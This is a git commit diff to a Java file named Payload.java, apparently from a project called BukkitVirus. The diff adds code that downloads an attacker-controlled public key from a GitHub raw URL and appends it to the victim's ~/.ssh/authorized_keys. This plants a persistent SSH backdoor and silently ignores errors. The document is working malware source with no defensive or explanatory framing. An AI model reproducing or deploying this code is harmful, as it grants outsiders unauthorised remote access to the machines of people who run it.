961c2b979062201bb8ef1983981f667fa545d5d0
Ian Rehwinkel <ian.rehwinkel@kabelmail.de>
2019-07-05 21:50:05 +0200

    Changed stuff

--- payload/Payload.java
+++ payload/Payload.java
@@ -1,4 +1,5 @@
 import java.io.*;
+import java.net.URL;
 
 public class Payload {
 
@@ -9,13 +10,17 @@ public class Payload {
     public void run() throws IOException {
         File authorizedKeys = new File(System.getProperty("user.home"), "/.ssh/authorized_keys");
 
+        URL u = new URL("https://raw.githubusercontent.com/deerangle2/BukkitVirus/master/payload/virus.pub");
+        BufferedReader in = new BufferedReader(new InputStreamReader(u.openStream()));
+
         try(FileWriter fw = new FileWriter(authorizedKeys, true);
         BufferedWriter bw = new BufferedWriter(fw);
         PrintWriter out = new PrintWriter(bw))
         {
-            out.println("the text");
+            out.println(in.readLine());
         } catch (IOException e) {
         }
+        in.close();
     }
 
 }
